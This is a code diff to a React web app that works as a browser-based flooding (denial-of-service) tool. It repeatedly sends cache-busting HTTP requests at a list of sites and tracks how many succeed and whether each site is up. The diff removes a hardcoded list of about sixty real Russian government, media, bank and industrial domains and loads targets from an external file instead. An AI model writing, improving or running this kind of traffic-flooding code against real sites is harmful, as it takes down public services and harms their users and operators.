@@ -7,79 +7,24 @@ const INTERVAL = 100
 // after how many requests to retest offline websites, change at your own risk
 const RETEST_OFFLINE_SITE = INTERVAL * 10
 
-const urls = [
-    "rt.com",
-    "smotrim.ru",
-    "tass.ru",
-    "tvzvezda.ru",
-    "vsoloviev.ru",
-    "1tv.ru",
-    "vgtrk.ru",
-    "zakupki.gov.ru",
-    "vesti.ru",
-    "online.sberbank.ru",
-    "duma.gov.ru",
-    "rtr-planeta.com",
-    "5-tv.ru",
-    "rg.ru",
-    "data.gov.ru",
-    "mchs.gov.ru",
-    "ac.gov.ru",
-    "svr.gov.ru",
-    "gov.ru",
-    "council.gov.ru",
-    "premier.gov.ru",
-    "minenergo.gov.ru",
-    "economy.gov.ru",
-    "edu.gov.ru",
-    "torgi.gov.ru",
-    "chechnya.gov.ru",
-    "epp.genproc.gov.ru",
-    "ach.gov.ru",
-    "scrf.gov.ru",
-    "gazprom.ru",
-    "lukoil.ru",
-    "magnit.ru",
-    "nornickel.com",
-    "surgutneftegas.ru",
-    "tatneft.ru",
-    "evraz.com/ru",
-    "nlmk.com",
-    "sibur.ru",
-    "severstal.com",
-    "metalloinvest.com",
-    "nangs.org",
-    "rmk-group.ru/ru",
-    "tmk-group.ru",
-    "ya.ru",
-    "polymetalinternational.com/ru",
-    "uralkali.com/ru",
-    "eurosib.ru",
-    "omk.ru",
-    "sberbank.ru",
-    "vtb.ru",
-    "gazprombank.ru",
-    "gosuslugi.ru",
-    "mos.ru/uslugi",
-    "kremlin.ru",
-    "government.ru",
-    "mil.ru",
-    "nalog.gov.ru",
-    "rkn.gov.ru",
-    "pfr.gov.ru",
-    "customs.gov.ru"
-]
-
 function App() {
     let [getRequests, setRequests] = useState([])
     let [getPostFirstLaunch, setPostFirstLaunch] = useState([])
-
-    let urlsArr = []
-
-    urls.map(() => urlsArr.push({id: 0, online: -1, requests: 0, errors: 0, retest: 0}))
+    let [getTargets, setTargets] = useState([])
 
     useEffect(() =>
     {
+        let targets = [], targetsData = []
+
+        console.log()
+
+        fetch(window.location.pathname+'/targets.txt').then((response) => response.text())
+            .then((data) => {
+                targets = data.split('\r\n')
+                setTargets(targets)
+                targets.map(() => targetsData.push({id: 0, online: -1, requests: 0, errors: 0, retest: 0}))
+            })
+
         function check(index, timeOut)
         {
             if(timeOut)
@@ -102,12 +47,12 @@ function App() {
             const timeout = setTimeout(() => abortAndUpdateStats(controller, index), 3000)
 
             if(getRequests.length === 0)
-                getRequests = urlsArr
+                getRequests = targetsData
 
             if(getRequests[index].online) {
                 const rand = '/?' + Math.random() * 1000
 
-                fetch("http://" + urls[index] + rand, options)
+                fetch("http://" + targets[index] + rand, options)
                     .then(res => {
                         clearTimeout(timeout)
                         setRequestsAndStatus(true, false)
@@ -154,7 +99,7 @@ function App() {
         }
 
         const interval = setInterval(() => {
-            for (let i = 0; i < urls.length; i++)
+            for (let i = 0; i < targets.length; i++)
             {
                 if(!getPostFirstLaunch[i]) { // spreading out request to avoid ERR_INSUFFICIENT_RESOURCES
                     const timeOut = setTimeout(() => {check(i, timeOut)}, Math.round(Math.random() * i * i * RETEST_OFFLINE_SITE))
@@ -183,16 +128,16 @@ function App() {
                 <div className="header cell">Errors</div>
             </div>
             {
-                getRequests.length > 0 ? getRequests.map((req, index) => {
+                (getRequests.length > 0 && getTargets.length > 0) ? getRequests.map((req, index) => {
                     return <div className="d-flex justify-content-center gap-3 mt-1 w-100" key={index}>
-                        <div className="cell text-start" style={{minWidth: "200px"}}><a href={"http://"+urls[index]} target="_blank">{urls[index]}</a></div>
+                        <div className="cell text-start" style={{minWidth: "200px"}}><a href={"http://"+getTargets[index]} target="_blank">{getTargets[index]}</a></div>
                         <div className="cell">{req.online === -1 ? <span style={{color: "grey"}}>Checking...</span> : req.online ? <span className="text-success">Online</span> : <span className="text-danger">Unreachable</span>}</div>
                         <div className="cell">{req.requests}</div>
                         <div className="cell">{req.errors}</div>
                     </div>
                 })
                 :
-                <div>LOADING...</div>
+                <div>WAITING FOR TARGETS...</div>
             }
             </div>
     </div>
